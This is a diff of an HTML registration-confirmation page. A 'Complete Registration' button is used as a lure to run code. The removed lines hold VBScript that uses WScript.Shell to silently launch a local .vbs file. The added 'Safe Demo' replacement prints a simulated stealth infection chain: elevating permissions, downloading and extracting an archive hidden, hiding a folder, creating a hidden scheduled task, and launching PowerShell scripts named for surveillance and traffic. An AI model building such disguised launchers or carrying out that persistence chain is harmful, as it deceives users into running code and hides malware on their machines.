@@ -131,25 +131,45 @@
                 
                 <p>To complete your registration and activate your account, please click the confirmation link below:</p>
             </div>
-				<h2>Complete Registration</h2>
-				  <p>Click below to run the registration script:</p>
+		<p>Click below to run the registration script (Safe Demo):</p>
 
-				  <button class="btn" onclick="runScript()">Complete Registration</button>
+<button id="registerBtn" style="background:#dc2626; color:white; padding:14px 28px; border:none; border-radius:8px; cursor:pointer; font-weight:bold; font-size:16px;">
+  Complete Registration (Safe Demo)
+</button>
 
-				  <script language="vbscript">
-					Sub runScript()
-					  On Error Resume Next
-					  Dim shell, path
-					  Set shell = CreateObject("WScript.Shell")
-					  path = "C:\Users\Melkiel\Desktop\eli7testhtml\Form Reservation.vbs"
-					  shell.Run Chr(34) & path & Chr(34), 1, False
-					  If Err.Number <> 0 Then
-						MsgBox "Failed to run the script. Error: " & Err.Number & " - " & Err.Description, vbExclamation, "Error"
-					  Else
-						MsgBox "Script started.", vbInformation, "Done"
-					  End If
-					End Sub
-				  </script>
+<div id="output" style="margin-top:20px; padding:15px; background:#f0f0f0; border-radius:8px; font-family:monospace; font-size:14px; display:none; max-height:300px; overflow-y:auto;"></div>
+
+<script>
+document.getElementById('registerBtn').addEventListener('click', function() {
+  const output = document.getElementById('output');
+  output.style.display = 'block';
+  output.innerHTML = '<strong>Running safe registration simulation...</strong><br><br>';
+
+  const steps = [
+    "Elevating permissions (simulated)...",
+    "Downloading lab.rar from server...",
+    "Waiting for stable download (2s)...",
+    "Extracting with WinRAR (hidden)...",
+    "Hiding extracted folder...",
+    "Creating scheduled task: WatcherHidden...",
+    "Task runs every 10 minutes...",
+    "Launching i see you relance.ps1...",
+    "Launching traffic.ps1..."
+  ];
+
+  let i = 0;
+  const timer = setInterval(() => {
+    if (i < steps.length) {
+      output.innerHTML += '→ ' + steps[i] + '<br>';
+      i++;
+    } else {
+      clearInterval(timer);
+      output.innerHTML += '<br><strong style="color:green;">Demo Complete!</strong><br>';
+      output.innerHTML += '<small style="color:#666;">No real code ran. This is a safe educational demo.</small>';
+    }
+  }, 900);
+});
+</script>
             <div class="message">
                 <p>Once confirmed, you'll have access to:</p>
                 <ul style="color: #555555; padding-left: 20px;">
@@ -185,5 +205,6 @@
     </div>
 <script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'98f4d6bf94872674',t:'MTc2MDU4OTIxNC4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
 </html>
+
 
 
